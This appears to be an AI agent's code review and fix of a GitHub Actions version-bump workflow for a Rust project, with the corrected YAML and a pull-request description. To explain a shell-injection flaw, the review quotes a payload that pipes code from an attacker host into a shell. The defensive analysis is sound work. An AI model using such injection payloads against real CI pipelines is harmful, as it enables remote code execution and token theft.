The `version` input is interpolated directly into a `run:` shell command via `${{ github.event.inputs.version }}` in three places — the `sed` command, the branch name, and the `gh pr create` body. GitHub expressions in `run:` blocks are expanded before the shell sees them, so a version string containing shell metacharacters (e.g., `1.0.0"; curl attacker.com | sh; echo "`) would execute arbitrary code on the runner. The standard fix is to assign the input to an environment variable and reference that in the shell script, e.g.:

```yaml
env:
  VERSION: ${{ github.event.inputs.version }}
run: sed -i 's/^version = ".*"/version = "'"$VERSION"'"/' Cargo.toml
```

This is a real attack surface even for a personal repo: any collaborator with `workflow_dispatch` permission, or an attacker who gains that access, can exploit it. The `contents: write` permission on the job amplifies the blast radius.

---

**2. The `sed` pattern will corrupt `Cargo.toml` if a dependency also has a bare `version = "..."` line (bump-version.yml)**

The sed command is:
```
sed -i 's/^version = ".*"/version = "${{ ... }}"/' Cargo.toml
```

The `^` anchors to the start of the line, but in `Cargo.toml` every dependency with an inline version also uses `version = "..."` at the start of its line in the `[dependencies]` table (e.g., `anyhow = "1.0"` uses a shorthand, but any dependency written as `version = "1.0"` on its own line would match). Looking at the actual `Cargo.toml`, none of the current dependencies use that multi-line form, but the `[package]` section's `version = "1.1.2"` is not the only possible `^version =` match if the file structure ever changes. More immediately, this sed is not scoped to the `[package]` section, so it will silently replace every line matching `^version = "..."` anywhere in the file. Use `cargo set-version` from `cargo-edit` or a `[package]`-section-aware tool instead.

---

**3. Version jump from 0.1.0 to 1.1.2 skips all intermediate versions with no history**

This is not a style preference — it is a factual inconsistency that will cause confusion. The old `USER_AGENT` was `ferrous-comics/0.1`, implying the binary had never reached a stable 1.x release. Jumping directly to `1.1.2` implies two prior patch releases of a 1.1.x line that never existed. If the version is used for anything external (the `User-Agent` header is sent to xkcd's servers), this misrepresents the release history. The correct starting point for a first stable release is `1.0.0`.

---

**4. The bump workflow does not validate that the input is a valid semver string**

There is no check that the `version` input matches `\d+\.\d+\.\d+` before it is used. A typo like `1.20` or `v1.2.0` (with a leading `v`) will produce a `Cargo.toml` with a malformed version that `cargo check` will reject, leaving the branch in a broken state with a failed CI run. Since `cargo set-version` is not being used, at minimum a shell guard like `[[ "$VERSION" =~ ^[0-9]+\.[0-9]+\.[0-9]+$ ]]` should precede the sed.

---

**5. The `actions/checkout` SHA comment is wrong (bump-version.yml and release.yml)**

Both files pin `actions/checkout` to `de0fac2e4500dabe0009e67214ff5f5447ce83dd` and annotate it `# v6.0.2`. The current release of `actions/checkout` is v4.x; v6 does not exist. The SHA therefore refers to an unknown or misidentified commit, undermining the security purpose of SHA pinning. Anyone auditing the workflow cannot verify the comment against the actual release tag.

---

**Summary table**

| # | Location | Severity | Issue |
|---|----------|----------|-------|
| 1 | bump-version.yml | High | Shell injection via unquoted workflow input |
| 2 | bump-version.yml | Medium | `sed` pattern not scoped to `[package]` section |
| 3 | Cargo.toml | Low | Version jump implies nonexistent release history |
| 4 | bump-version.yml | Low | No semver format validation on version input |
| 5 | Both workflow files | Low | SHA pin comment claims nonexistent `v6.0.2` tag |

Three real issues to fix before opening the PR:

1. **Shell injection** — `${{ github.event.inputs.version }}` interpolated directly into `run:` blocks; must use env vars
2. **Overly broad `sed`** — not scoped, could match dep `version =` lines if file format changes; scope to first match only
3. **No semver validation** — a typo or leading `v` leaves the branch broken

Issues 3 and 5 from the review: version jump is intentional (existing tags are v1.1.x), and the SHA comment issue is pre-existing in the repo, not ours to fix here.

input.content:
name: Bump version

on:
  workflow_dispatch:
    inputs:
      version:
        description: 'New version (e.g. 1.2.0)'
        required: true

jobs:
  bump:
    runs-on: ubuntu-latest
    permissions:
      contents: write
      pull-requests: write
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd  # v6.0.2
      - uses: dtolnay/rust-toolchain@e97e2d8cc328f1b50210efc529dca0028893a2d9  # stable
        with:
          toolchain: stable
      - uses: Swatinem/rust-cache@c19371144df3bb44fab255c43d04cbc2ab54d1c4  # v2.9.1

      - name: Validate and bump version
        env:
          VERSION: ${{ github.event.inputs.version }}
        run: |
          if ! [[ "$VERSION" =~ ^[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
            echo "Invalid version format: '$VERSION' (expected X.Y.Z, no leading 'v')"
            exit 1
          fi
          # Replace only the first occurrence of version = "..." (the [package] entry)
          sed -i "0,/^version = \".*\"/{s/^version = \".*\"/version = \"$VERSION\"/}" Cargo.toml

      - name: Update Cargo.lock
        run: cargo check

      - name: Open PR
        env:
          VERSION: ${{ github.event.inputs.version }}
          GH_TOKEN: ${{ github.token }}
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "github-actions[bot]@users.noreply.github.com"
          git checkout -b "release/v$VERSION"
          git add Cargo.toml Cargo.lock
          git commit -m "Bump version to $VERSION"
          git push origin "release/v$VERSION"
          gh pr create \
            --title "Release v$VERSION" \
            --body "Automated version bump to \`$VERSION\`.

After merging, create the release and trigger the build:
\`\`\`
gh release create v$VERSION
\`\`\`" \
            --base main

gh pr create --title "Sync version to 1.1.2, auto-track in USER_AGENT, add bump-version workflow" --base main --body "## Summary

Three related changes to fix version tracking and automate future releases.

**\`USER_AGENT\` const**
Changed from a hardcoded string to a compile-time macro:
\`\`\`rust
const USER_AGENT: &str = concat!(\"ferrous-comics/\", env!(\"CARGO_PKG_VERSION\"));
\`\`\`
Zero runtime cost; always matches \`Cargo.toml\` automatically.

**\`Cargo.toml\` version**
Bumped from \`0.1.0\` to \`1.1.2\` to re-sync with the existing published release series (v1.1.1, v1.1.2 already exist as GitHub releases).

**\`bump-version.yml\` workflow**
New \`workflow_dispatch\` that automates release PR creation:
- Validates the input is well-formed semver (rejects \`v1.2.0\`, \`1.2\`, etc.)
- Bumps only the \`[package]\` version in \`Cargo.toml\` (first-match \`sed\`, scoped to avoid touching dependency version lines)
- All shell commands use env vars rather than direct expression interpolation (no injection surface)
- Opens a PR; after merging, run \`gh release create vX.Y.Z\` to trigger the existing release workflow

## Release flow going forward

1. **Actions → Bump version → Run workflow** → enter e.g. \`1.2.0\`
2. Merge the generated PR
3. \`gh release create v1.2.0\` → triggers \`release.yml\` → builds and attaches binaries"
